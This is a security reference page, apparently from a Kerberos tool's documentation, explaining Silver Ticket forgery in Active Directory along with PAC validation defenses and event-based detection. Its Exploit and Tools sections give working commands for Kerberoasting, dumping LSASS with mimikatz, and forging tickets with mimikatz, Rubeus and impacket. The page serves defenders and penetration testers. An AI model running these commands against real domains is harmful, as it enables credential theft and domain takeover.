---
---

# Silver Ticket

Forging service tickets without contacting the domain controller.

A Silver Ticket is a forged service ticket (TGS) encrypted with the target account's
secret key. Unlike a [Golden Ticket](../forgery/golden-ticket.md), which forges a TGT and then requests
service tickets through the KDC, a Silver Ticket goes directly to the
[AP Exchange](../../protocol/ap-exchange.md) -- no domain controller contact required. The attacker
controls the [PAC](../../protocol/tickets.md#pac) contents and can claim any identity and group
membership for the targeted service.

---

## How It Works

During the [AP Exchange](../../protocol/ap-exchange.md), the target service decrypts the service
ticket using its own secret key, extracts the PAC, and builds a Windows access token from the
group SIDs in the PAC. The service does **not** contact a domain controller to verify the ticket
contents by default.

This creates the attack:

1. The attacker obtains the target account's secret key (NT hash or AES key)
2. The attacker constructs a service ticket from scratch:
    - Sets `cname` to the user they want to impersonate
    - Populates the PAC with arbitrary group SIDs (e.g., Domain Admins)
    - Signs the `PAC_SERVER_CHECKSUM` with the target account's key
    - Fabricates the `PAC_PRIVSVR_CHECKSUM` (KDC signature) -- since the service does not
      validate it by default, any value works
3. The attacker presents the forged ticket directly to the service in an AP-REQ
4. The service decrypts the ticket, reads the PAC, and grants access based on the forged group
   memberships

```
Attacker                              Target Service
   |                                      |
   |  AP-REQ with forged service ticket   |
   |  (encrypted with service's key)      |
   |  PAC claims: Domain Admins           |
   |------------------------------------->|
   |                                      |  Decrypt ticket -- success
   |                                      |  Read PAC -- Domain Admin
   |                                      |  Build access token
   |  AP-REP (access granted)             |
   |<-------------------------------------|
```

!!! warning "No DC contact means no DC logs"
    Because the Silver Ticket is presented directly to the target service, the domain controller
    never sees the authentication. There are no Event 4769 (TGS request) logs at the DC for this
    ticket. Detection must occur at the target service host.

### PAC Signature Bypass

The PAC contains two signatures (see [Ticket Structure -- PAC](../../protocol/tickets.md#pac)):

| Signature | Key | Validated by default? |
|---|---|---|
| `PAC_SERVER_CHECKSUM` | Target account's key | Yes -- the service checks this |
| `PAC_PRIVSVR_CHECKSUM` | `krbtgt` account's key | No -- requires `ValidateKdcPacSignature = 1` |

Since the attacker has the target account's key, they can compute a valid `PAC_SERVER_CHECKSUM`.
The `PAC_PRIVSVR_CHECKSUM` cannot be computed (the attacker does not have the `krbtgt` key), but
most services never validate it. The service trusts the PAC contents without contacting the KDC.

---

## Common Silver Ticket Targets

The target account's key determines which services can be accessed. The scope of a Silver Ticket
is limited to the specific service (or services) whose key was compromised.

| Target | SPN Class | What You Get |
|---|---|---|
| File shares (SMB) | `CIFS/hostname` | Read/write access to all shares on the target host |
| Remote execution (WMI) | `HOST/hostname` + `RPCSS/hostname` | Remote command execution via WMI |
| Scheduled tasks | `HOST/hostname` | Create and modify scheduled tasks |
| PowerShell Remoting | `HTTP/hostname` + `WSMAN/hostname` | WinRM / PSRemoting shell access |
| LDAP on a DC | `LDAP/dc.domain.local` | AD queries; potentially DCSync if targeting a DC |
| SQL Server | `MSSQLSvc/hostname` or `MSSQLSvc/hostname:port` | Database access as any user |

!!! danger "Silver Ticket to a Domain Controller's LDAP service"
    If the attacker obtains a DC's computer account hash and forges a Silver Ticket for the
    `LDAP` service on that DC, they can perform DCSync -- replicating all credentials from
    Active Directory. This escalates a single computer account compromise to full domain
    compromise.

---

## Defend

### Enable PAC Validation

Force services to validate the KDC signature by contacting a domain controller:

```
HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Kerberos\Parameters
  ValidateKdcPacSignature = 1 (DWORD)
```

When enabled, the service sends the PAC to a DC for verification. The DC checks the
`PAC_PRIVSVR_CHECKSUM` using the `krbtgt` key. A Silver Ticket with a fabricated KDC signature
will fail this check.

!!! tip "Performance consideration"
    PAC validation adds a round trip to a domain controller for every service ticket validation.
    Enable it on high-value services first (DCs, file servers with sensitive data, SQL servers).

### Strong Passwords for User Service Accounts

The service key is most commonly obtained by [Kerberoasting](../roasting/kerberoasting.md) user service
accounts with weak passwords. Mitigate this by:

- Using **Group Managed Service Accounts (gMSA)**: automatically rotating, 128 random UTF-16 character (256-byte)
  passwords that cannot be Kerberoasted in practice
- Setting minimum 25-character random passwords for any user service account
- Removing SPNs from accounts that do not need them

### Credential Guard

Enable Credential Guard on service hosts to prevent LSASS memory extraction of computer account
keys. This blocks the attacker from obtaining the key through local compromise of the service
host.

### Computer Account Password Rotation

Computer accounts change their password every 30 days by default. Verify this is not disabled:

```powershell title="Find computer accounts with stale passwords (rotation may be disabled)"
# Check for machines with password change disabled
Get-ADComputer -Filter * -Properties PasswordLastSet |
    Where-Object { $_.PasswordLastSet -lt (Get-Date).AddDays(-60) } |
    Select-Object Name, PasswordLastSet
```

---

## Detect

Silver Ticket detection is harder than Golden Ticket detection because there is no domain
controller involvement. Detection must happen at the target host.

### Missing TGS Request

In a normal Kerberos flow, a service ticket is obtained through a TGS-REQ (Event 4769 at the DC)
before being presented to the service. A Silver Ticket skips the TGS Exchange. Look for:

- **Event 4624** (successful logon, type 3 network) at the target host **without** a
  corresponding **Event 4769** at the DC for the same user and service
- This requires cross-correlating events between the target host and the DC

### PAC Validation Failures

If `ValidateKdcPacSignature` is enabled, failed PAC validation generates events:

- The service contacts the DC, the DC rejects the PAC signature, and the authentication fails
- Monitor for authentication failures on services with PAC validation enabled

### Anomalous Access Patterns

- Administrative access to a server from a user or IP that has never connected before
- Access to high-value resources (C$ share, ADMIN$ share) by unexpected accounts
- Logon events with unusual or empty domain fields

### Windows Event Correlation

| Event | Source | What to look for |
|---|---|---|
| 4624 (type 3) | Target host | Network logon from unexpected source |
| 4634 | Target host | Logoff following suspicious 4624 |
| 4769 | Domain controller | **Absence** of this event for the session in 4624 |
| 4672 | Target host | Special privilege logon -- indicates the forged PAC claimed admin rights |

---

## Exploit

### Prerequisites

1. **Target account hash** -- obtained through:
    - [Kerberoasting](../roasting/kerberoasting.md) (for user-based SPNs)
    - LSASS dump on the service host (for computer accounts)
    - DCSync (any account's hash)
2. **Domain name** -- e.g., `CORP.LOCAL`
3. **Domain SID** -- e.g., `S-1-5-21-...`
4. **Target SPN** -- e.g., `CIFS/fileserver.corp.local`
5. **Username to impersonate** -- typically `administrator`

### Step-by-Step

1. **Obtain the account hash**:

    For a user service account, Kerberoast and crack the ticket:

    ```bash
    kw-roast -d CORP.LOCAL --dc-ip 10.0.0.1 -u jsmith -p 'Password1!' -t svc_sql
    hashcat -m 13100 hash.txt wordlist.txt
    ```

    For a computer account, dump from LSASS on the target host:

    ```
    mimikatz # sekurlsa::logonpasswords
    ```

2. **Forge the Silver Ticket**:

    ```
    mimikatz # kerberos::golden /domain:CORP.LOCAL /sid:S-1-5-21-... /target:fileserver.corp.local /service:CIFS /rc4:<service_account_hash> /user:administrator /ptt
    ```

    Despite the command name `kerberos::golden`, the `/service` and `/target` parameters tell
    mimikatz to create a service ticket (Silver Ticket), not a TGT.

3. **Access the service**:

    ```
    dir \\fileserver.corp.local\c$
    ```

    The forged service ticket is presented directly to the CIFS service. The service decrypts it,
    reads the PAC claiming Domain Admin, and grants access.

---

## Tools

!!! info "kerbwolf does not implement Silver Ticket forging"
    Silver Ticket creation requires the target account's key and PAC manipulation. kerbwolf
    focuses on the Kerberos authentication exchanges, not ticket forging.

| Tool | Command | Notes |
|---|---|---|
| mimikatz | `kerberos::golden /domain:CORP.LOCAL /sid:S-1-5-21-... /target:host.corp.local /service:CIFS /rc4:<hash> /user:administrator /ptt` | Forges TGS and injects into memory |
| Rubeus | `Rubeus.exe silver /rc4:<hash> /user:administrator /domain:CORP.LOCAL /sid:S-1-5-21-... /service:CIFS/host.corp.local /ptt` | Supports RC4 and AES keys |
| impacket | `ticketer.py -nthash <hash> -domain-sid S-1-5-21-... -domain CORP.LOCAL -spn CIFS/host.corp.local administrator` | Outputs ccache file |
